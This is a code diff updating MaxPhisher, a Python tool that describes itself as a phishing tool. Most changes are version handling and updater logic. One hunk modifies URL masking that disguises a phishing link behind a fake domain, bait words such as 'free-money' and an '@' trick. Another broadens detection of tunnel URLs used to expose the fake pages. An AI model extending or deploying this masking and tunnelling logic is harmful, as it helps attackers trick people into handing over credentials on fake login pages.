@@ -1,9 +1,8 @@
 # -*- coding: UTF-8 -*-
 # ToolName   : MaxPhisher
 # Author     : KasRoudra
-# Version    : 1.1
 # License    : MIT
-# Copyright  : KasRoudra (2021-2022)
+# Copyright  : KasRoudra (2022-2023)
 # Github     : https://github.com/KasRoudra
 # Contact    : https://m.me/KasRoudra
 # Description: MaxPhisher is a phishing tool in python
@@ -19,7 +18,7 @@
 """
 MIT License
 
-Copyright (c) 2022 KasRoudra
+Copyright (c) 2022-2023 KasRoudra
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
@@ -130,7 +129,7 @@ bcyan="\033[1;36m"
 white="\033[0;37m"
 nc="\033[00m"
 
-version="1.1"
+version="1.1.3"
 
 # Regular Snippets
 ask  =     f"{green}[{white}?{green}] {yellow}"
@@ -148,8 +147,8 @@ logo = f"""
 {yellow}| |\/| |/ _` \ \/ / |_) | '_ \| / __| '_ \ / _ \ '__|
 {blue}| |  | | (_| |>  <|  __/| | | | \__ \ | | |  __/ |
 {red}|_|  |_|\__,_/_/\_\_|   |_| |_|_|___/_| |_|\___|_|
-{yellow}{" "*31}             [{blue}v{version}{yellow}]
-{cyan}{" "*28}        [{blue}By {green}\x4b\x61\x73\x52\x6f\x75\x64\x72\x61{cyan}]
+{yellow}{" "*35}         [{blue}v{version[:3]}{yellow}]
+{cyan}{" "*36}[{blue}By {green}\x4b\x61\x73\x52\x6f\x75\x64\x72\x61{cyan}]
 """
 
 lx_help = f"""
@@ -420,6 +419,8 @@ def append(text, filename):
     with open(filename, "a") as file:
         file.write(str(text)+"\n")
 
+def get_ver(ver):
+    return int(ver.replace(".", "", 2))
 
 # Print lines slowly
 def sprint(text, second=0.05):
@@ -1020,13 +1021,17 @@ def masking(url):
         sprint(f"\n{error}No domain!")
         domain = "https://"
     else:
-        domain = sub("([/%+&?={} ])", ".", sub("https?://", "", domain))
-        domain = "https://"+domain+"-"
+        domain = "https://" + sub("([/%+&?={} ])", ".", sub("https?://", "", domain))
     bait = input(f"\n{ask}Enter bait words with hyphen without space (Example: free-money, pubg-mod) > ")
     if bait=="":
         sprint(f"\n{error}No bait word!")
+        if domain!="https://":
+            bait = "@"
     else:
-        bait = sub("([/%+&?={} ])", "-", bait)+"@"
+        if domain!="https://":
+            bait = "-" + sub("([/%+&?={} ])", "-", bait) + "@"
+        else:
+            bait = sub("([/%+&?={} ])", "-", bait) + "@"
     final = domain+bait+short
     print()
     #sprint(f"\n{success}Your custom url is > {bcyan}{final}")
@@ -1050,11 +1055,17 @@ def updater():
     if not isfile("files/maxphisher.gif"):
         return
     try:
-        git_ver = get("https://raw.githubusercontent.com/KasRoudra/MaxPhisher/main/files/version.txt").text.strip()
+        toml_data = get("https://raw.githubusercontent.com/KasRoudra/MaxPhisher/main/files/pyproject.toml").text
+        pattern = r'version\s*=\s*"([^"]+)"'
+        match = search(pattern, toml_data)
+        if match:
+            gh_ver = match.group(1)
+        else:
+            gh_ver = "404: Not Found"
     except Exception as e:
         append(e, error_file)
-        git_ver = version
-    if git_ver != "404: Not Found" and float(git_ver) > float(version):
+        gh_ver = version
+    if gh_ver != "404: Not Found" and get_ver(gh_ver) > get_ver(version):
         # Changelog of each versions are seperated by three empty lines
         changelog = get("https://raw.githubusercontent.com/KasRoudra/MaxPhisher/main/files/changelog.log").text.split("\n\n\n")[0]
         clear(fast=True)
@@ -1186,7 +1197,7 @@ def requirements():
     if isfile(f"{sites_dir}/version.txt"):
         with open(f"{sites_dir}/version.txt", "r") as sites_file:
             zipver=sites_file.read().strip()
-            if float(version) > float(zipver):
+            if get_ver(version) > get_ver(zipver):
                 # download(websites_url, "maxsites.zip")
                 print(f"\n{info2}Downloading website files....{nc}")
                 delete(sites_dir)
@@ -1409,7 +1420,7 @@ def server():
         sleep(1)
     lhr_success = False
     for i in range(10):
-        lhr_url = grep("(https://[-0-9a-z.]*.lhr.life)", lhr_file)
+        lhr_url = grep("(https://[-0-9a-z.]*.lhr.(life|pro))", lhr_file)
         if lhr_url != "":
             lhr_success = True
             break
@@ -1502,12 +1513,15 @@ def waiter():
     except KeyboardInterrupt:
         pexit()
 
-if __name__ == '__main__':
+def main():
     try:
         main_menu()
     except KeyboardInterrupt:
         pexit()
     except Exception as e:
         exception_handler(e)
+
+if __name__ == '__main__':
+    main()
             
 # If this code helped you, consider staring repository. Your stars encourage me a lot!
